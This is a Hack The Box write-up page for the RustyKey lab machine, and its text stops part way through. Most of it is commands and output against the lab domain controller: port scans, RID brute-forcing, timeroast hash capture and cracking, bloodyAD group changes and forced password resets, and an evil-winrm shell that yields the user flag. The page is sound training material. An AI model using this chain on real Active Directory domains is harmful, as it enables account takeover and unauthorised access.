@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Machine Information As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap -p- 10.129.201.253 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 01:10 CEST Nmap scan report for 10.129.201.253 Host is up (0.028s latency). Not shown: 65510 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-rustykey/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Machine Information As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap -p- 10.129.201.253 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 01:10 CEST Nmap scan report for 10.129.201.253 Host is up (0.028s latency). Not shown: 65510 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+  <meta itemprop="wordCount" content="3940">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Machine Information As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap -p- 10.129.201.253 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 01:10 CEST Nmap scan report for 10.129.201.253 Host is up (0.028s latency). Not shown: 65510 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-rustykey/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="machine-information">Machine Information</h1>
+<p>As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A</p>
+<h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>nmap -p- 10.129.201.253                                                          
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 01:10 CEST
+Nmap scan report for 10.129.201.253
+Host is up (0.028s latency).
+Not shown: 65510 closed tcp ports (reset)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the services which are open on the ip address.</p>
+<pre tabindex="0"><code>nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -sCV 10.129.201.253      
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 01:15 CEST
+Nmap scan report for rustykey.htb (10.129.201.253)
+Host is up (0.037s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-01 00:36:59Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 1h21m16s
+| smb2-time: 
+|   date: 2025-07-01T00:37:06
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.45 seconds
+</code></pre><p>Before downloading the data from the LDAP server to put it in Bloodhound, I noticed that the port for the SMB server is open. So I will first check whether I can connect using the user credentials I received from HTB. As you can see below, I will first have to fake ntpdate for the command to work.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ nxc smb dc.rustykey.htb -u rr.parker -p &#39;8#t5HE8L!W3A&#39; -k        
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A KRB_AP_ERR_SKEW 
+
+┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ sudo ntpdate 10.129.201.23 
+2025-07-02 03:27:02.524323 (+0200) +380.487905 +/- 0.007917 10.129.201.23 s1 no-leap
+CLOCK: time stepped by 380.487905
+
+┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ nxc smb dc.rustykey.htb -u rr.parker -p &#39;8#t5HE8L!W3A&#39; -k
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
+</code></pre><p>As you can see above, I can connect to the SMB server with the user credentials. Now I&rsquo;m going to see if I can use the &ndash;rid-brute parameter to retrieve the RIDs of the users within the domain ‘dc.rustykey.htb’. We will be able to use these later.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ nxc smb dc.rustykey.htb -u rr.parker -p &#39;8#t5HE8L!W3A&#39; -k --rid-brute
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
+SMB         dc.rustykey.htb 445    dc               498: RUSTYKEY\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               500: RUSTYKEY\Administrator (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               501: RUSTYKEY\Guest (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               502: RUSTYKEY\krbtgt (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               512: RUSTYKEY\Domain Admins (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               513: RUSTYKEY\Domain Users (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               514: RUSTYKEY\Domain Guests (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               515: RUSTYKEY\Domain Computers (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               516: RUSTYKEY\Domain Controllers (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               517: RUSTYKEY\Cert Publishers (SidTypeAlias)
+SMB         dc.rustykey.htb 445    dc               518: RUSTYKEY\Schema Admins (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               519: RUSTYKEY\Enterprise Admins (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               520: RUSTYKEY\Group Policy Creator Owners (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               521: RUSTYKEY\Read-only Domain Controllers (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               522: RUSTYKEY\Cloneable Domain Controllers (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               525: RUSTYKEY\Protected Users (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               526: RUSTYKEY\Key Admins (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               527: RUSTYKEY\Enterprise Key Admins (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               553: RUSTYKEY\RAS and IAS Servers (SidTypeAlias)
+SMB         dc.rustykey.htb 445    dc               571: RUSTYKEY\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         dc.rustykey.htb 445    dc               572: RUSTYKEY\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         dc.rustykey.htb 445    dc               1000: RUSTYKEY\DC$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1101: RUSTYKEY\DnsAdmins (SidTypeAlias)
+SMB         dc.rustykey.htb 445    dc               1102: RUSTYKEY\DnsUpdateProxy (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1103: RUSTYKEY\Support-Computer1$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1104: RUSTYKEY\Support-Computer2$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1105: RUSTYKEY\Support-Computer3$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1106: RUSTYKEY\Support-Computer4$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1107: RUSTYKEY\Support-Computer5$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1118: RUSTYKEY\Finance-Computer1$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1119: RUSTYKEY\Finance-Computer2$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1120: RUSTYKEY\Finance-Computer3$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1121: RUSTYKEY\Finance-Computer4$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1122: RUSTYKEY\Finance-Computer5$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1123: RUSTYKEY\IT-Computer1$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1124: RUSTYKEY\IT-Computer2$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1126: RUSTYKEY\IT-Computer4$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1127: RUSTYKEY\IT-Computer5$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1128: RUSTYKEY\HelpDesk (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1130: RUSTYKEY\Protected Objects (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1131: RUSTYKEY\IT (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1132: RUSTYKEY\Support (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1133: RUSTYKEY\Finance (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1136: RUSTYKEY\DelegationManager (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1137: RUSTYKEY\rr.parker (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1138: RUSTYKEY\mm.turner (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1139: RUSTYKEY\bb.morgan (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1140: RUSTYKEY\gg.anderson (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1143: RUSTYKEY\dd.ali (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1145: RUSTYKEY\ee.reed (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1146: RUSTYKEY\nn.marcos (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               3601: RUSTYKEY\backupadmin (SidTypeUser)
+</code></pre><p>We have been given a username by HTB. I will use this to retrieve the data from the LDAP server so that I can put it into Bloodhound.</p>
+<pre tabindex="0"><code>bloodhound-python -u &#39;rr.parker&#39; -p &#39;8#t5HE8L!W3A&#39; -d rustykey.htb -dc dc.rustykey.htb -ns 10.129.201.253 -c all --zip 
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: rustykey.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc.rustykey.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 16 computers
+INFO: Connecting to LDAP server: dc.rustykey.htb
+INFO: Found 12 users
+INFO: Found 58 groups
+INFO: Found 2 gpos
+INFO: Found 10 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: dc.rustykey.htb
+INFO: Done in 00M 06S
+INFO: Compressing output into 20250701025439_bloodhound.zip
+</code></pre><p>I went for this command because the command I always use is not supported.</p>
+<pre tabindex="0"><code>nxc ldap 10.129.201.253 -u rr.parker -p &#39;8#t5HE8L!W3A&#39; --bloodhound --collection All --dns-server 10.129.201.253
+LDAP        10.129.201.253  389    DC               [*] None (name:DC) (domain:rustykey.htb)
+LDAP        10.129.201.253  389    DC               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
+</code></pre><p>I checked out Bloodhound, but there was nothing there that would help us with the user credentials we already had.</p>
+<p>![[Pasted image 20250701195328.png]]</p>
+<p>I then looked in Bloodhound for the ‘shortest path to Tier Zero’. There you can see that you can use the user mm.turner to obtain the shortest path to Tier Zero. Since we don&rsquo;t have any user credentials for this user and we can&rsquo;t change them, I will have to find another way to obtain this user. This will probably be through kerberoasting tickets.</p>
+<p>First, I will check which encryption is used for the TGS tickets. I did this by using the Impacket <code>getTGT</code> tool. With this command, I requested a Kerberos Ticket Granting Ticket (TGT) and saved it in a <code>.ccache</code> file.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ impacket-getTGT -dc-ip 10.129.201.23 RUSTYKEY.HTB/rr.parker:&#39;8#t5HE8L!W3A&#39;      
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in rr.parker.ccache
+</code></pre><p>After executing this command, the program reported that the ticket had been successfully saved in the file rr.parker.ccache.
+This allows me to check which encryption type was used for the ticket.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ klist -e -c rr.parker.ccache
+Ticket cache: FILE:rr.parker.ccache
+Default principal: rr.parker@RUSTYKEY.HTB
+
+Valid starting       Expires              Service principal
+07/02/2025 03:47:59  07/02/2025 13:47:59  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
+        renew until 07/03/2025 03:45:53, Etype (skey, tkt): DEPRECATED:arcfour-hmac, DEPRECATED:arcfour-hmac
+</code></pre><p>Above, you can see that RC4-HMAC encryption was used for kerberoasting. So now I&rsquo;m going to look for an exploit. I looked up all the exploits you can do with RC4-HMAC encryption, which includes timeroasting, kerberoasting, etc. To do timeroasting, I looked at various tools such as GetUserSPN.py and kerberoast.py, but the tool that surprised me was the nxc tool, which I didn&rsquo;t know had this parameter. For this, I used the following Knowledge article. <a href="https://0xss0rz.gitbook.io/0xss0rz/pentest/internal-pentest/timeroast">https://0xss0rz.gitbook.io/0xss0rz/pentest/internal-pentest/timeroast</a></p>
+<p>So, if I execute the command now, I will get the hashes dumped with rid&rsquo;s and I will put them directly into a file.</p>
+<pre tabindex="0"><code>nxc smb dc.rustykey.htb -u rr.parker -p &#39;8#t5HE8L!W3A&#39; -k -M timeroast \
+| grep &#39;\$sntp-ms\$&#39; \
+| awk &#39;{print $(NF-1) $(NF)}&#39; \
+| sed &#39;s/^dc//&#39; &gt; timeroast_hashes.txt
+</code></pre><p>I had ChatGPT modify the code above so that you get the output in a file as shown below.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ cat timeroast_hashes.txt
+$sntp-ms$aa6684ad351b5a4b86d6565d539960f7$1c0111e900000000000a16a94c4f434cec0f06e086f7878be1b8428bffbfcd0aec0f24c17aef474bec0f24c17aef6075
+$sntp-ms$349663cbc21ebf8c401cb53d2b6146b9$1c0111e900000000000a16a94c4f434cec0f06e088896213e1b8428bffbfcd0aec0f24c17c812026ec0f24c17c813950
+...
+</code></pre><p>I will now try to crack the hashes using hashcat. You need to check whether you have the module_31300.so module from hashcat, because if you don&rsquo;t have it, you won&rsquo;t be able to crack them. As you can see below, we have executed the hashcat command. I downloaded the following page to get the correct hashcat. <a href="https://hashcat.net/beta/">https://hashcat.net/beta/</a></p>
+<pre tabindex="0"><code>./hashcat-6.2.6/hashcat.bin -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt
+[sudo] password for kali: 
+</code></pre><p>If I now look at the file where the cracked passwords are stored, you can see that a password called Rusty88! has been cracked. If I look at the rid that this hash has been assigned, you can then see that this user is ‘1125: RUSTYKEY\IT-Computer3$’.</p>
+<pre tabindex="0"><code>Cracked password in the file
+
+┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ sudo cat ./hashcat-6.2.6/hashcat.potfile
+$sntp-ms$2a7045ffc920b734b3cc6bb8b0061cdb$1c0111e900000000000a1e2b4c4f434cec0f06e085ee25e2e1b8428bffbfcd0aec0f2ea659e5cc78ec0f2ea659e60c38:Rusty88!
+
+Check RID
+
+TIMEROAST dc.rustykey.htb 445 dc 1125:$sntp-ms$2a7045ffc920b734b3cc6bb8b0061cdb$1c0111e900000000000a1e2b4c4f434cec0f06e085ee25e2e1b8428bffbfcd0aec0f2ea659e5cc78ec0f2ea659e60c38
+
+Check user that is known to that RID
+
+SMB         dc.rustykey.htb 445    dc               1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)
+</code></pre><p>So now that we have the user credentials of the ‘IT-Computer3$’ user, we can check in Bloodhound to see if we can exploit them.</p>
+<p>![[Pasted image 20250701234538.png]]</p>
+<p>As you can see here, if you are this user, you can add yourself to the helpdesk OU. As you can see below, I am trying to add the user using the ‘net’ tool, but apparently this is not supported either.</p>
+<pre tabindex="0"><code>net rpc group addmem &#34;HelpDesk&#34; &#34;HelpDesk&#34; -U &#34;rustykey.htb&#34;/&#34;IT-Computer3$&#34;%&#39;Rusty88!&#39; -S &#34;dc.rustykey.htb&#34; 
+Could not connect to server dc.rustykey.htb
+Connection failed: NT_STATUS_NOT_SUPPORTED
+</code></pre><p>So I decided to do this using BloodyAD. First, I will request a Kerberos Ticket Granting Ticket (TGT) again, which will be stored in a <code>.ccache</code> file, but this time I will do this for the user ‘IT-Computer3$’. Then, using the ccache and bloodyAD tools, I will add the user to that group.</p>
+<pre tabindex="0"><code>└─$ impacket-getTGT -dc-ip 10.129.201.23 RUSTYKEY.HTB/IT-Computer3$:&#39;Rusty88!&#39;                                  
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in IT-Computer3$.ccache
+
+┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#39;IT-Computer3$&#39; -p &#39;Rusty88!&#39; add groupMember HELPDESK &#39;IT-Computer3$&#39;
+[+] IT-Computer3$ added to HELPDESK
+</code></pre><p>If we now look in Bloodhound, you can see that the user with the rights we just changed can change the passwords of the following four users.</p>
+<ul>
+<li>bb.morgan</li>
+<li>dd.ali</li>
+<li>gg.anderson</li>
+<li>ee.reed</li>
+</ul>
+<p>We can also make ourselves a member of the Protected Objects group, which is a member of the Protected Users group.</p>
+<p>![[Pasted image 20250702195707.png]]</p>
+<p>Now I will change the password for each user.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#39;IT-Computer3$&#39; -p &#39;Rusty88!&#39; set password bb.morgan &#39;Hallo@123&#39;
+[+] Password changed successfully!
+
+┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#39;IT-Computer3$&#39; -p &#39;Rusty88!&#39; set password ee.reed &#39;Hallo@123&#39;
+[+] Password changed successfully!
+
+┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#39;IT-Computer3$&#39; -p &#39;Rusty88!&#39; set password gg.anderson &#39;Hallo@123&#39;
+[+] Password changed successfully!
+
+┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#39;IT-Computer3$&#39; -p &#39;Rusty88!&#39; set password dd.ali &#39;Hallo@123&#39;
+[+] Password changed successfully!
+</code></pre><p>Now that the users&rsquo; passwords have been changed, I will run the TGT ticket again for the user bb.morgan. However, as you will see below, we will receive an error message stating that the encryption type is not supported. This means that this command is likely being blocked by the Protected Objects group.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/bb.morgan:Hallo@123                       
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
+</code></pre><p>You must remove the Protected Objects group from the users. The DC only allows RC4-HMAC encryption, but the members of the protected users can only login with AES 256 or 128, without removing the group you would always receive the KDC_ERR_ETYPE_NOSUPP error.</p>
+<p>![[Pasted image 20250702200839.png]]</p>
+<p>I will now remove the IT group from the Protected Objects group by using the following command.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u &#39;IT-COMPUTER3$&#39; -p &#39;Rusty88!&#39; -k remove groupMember &#39;PROTECTED OBJECTS&#39; &#39;IT&#39;                               
+[-] IT removed from PROTECTED OBJECTS
+</code></pre><p>And if we now repeat the command for creating the TGT ticket, you will see that it will now work.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/bb.morgan:Hallo@123 -k                                                                                        
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in bb.morgan.ccache
+</code></pre><p>Now I will log in to the Windows machine by first authenticating the Kerberos ticket with the .ccache file I just created. You can do this by using the following command.</p>
+<pre tabindex="0"><code>──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ export KRB5CCNAME=bb.morgan.ccache
+</code></pre><p>We will now be able to connect to the Windows server without having to provide a password, because the authentication (data) from the file is used.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: User is not needed for Kerberos auth. Ticket will be used
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt;
+</code></pre><p>If we go to the Desktop folder, we will see two files there. One of them is a PDF file for internal users, and the other file is the user flag that we have now obtained.</p>
+<p>User flag: 1f9c50b4f868d12b441f4188fc9847e2</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\bb.morgan&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\bb.morgan\Desktop&gt; ls
+
+
+    Directory: C:\Users\bb.morgan\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/4/2025   9:15 AM           1976 internal.pdf
+-ar---         7/2/2025   9:15 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\bb.morgan\Desktop&gt; cat user.txt
+1f9c50b4f868d12b441f4188fc9847e2
+</code></pre><p>I would like to view the PDF file, but first I will need to download it from the Windows server to my own machine. You can do this by using the Download command on the evil-winrm connection.</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\bb.morgan\Desktop&gt; download internal.pdf
+                                        
+Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf
+                                        
+Info: Download successful!
+</code></pre><p>As you will see below, bb.morgan informs the support team that <strong>temporary extra access</strong> has been granted to test the <strong>archiving tool (packing and unpacking files)</strong> on shared workstations and to resolve issues. This is being done in response to complaints from the Finance and IT teams. This means that the support team has access to the registry, where they can make adjustments and test things out.</p>
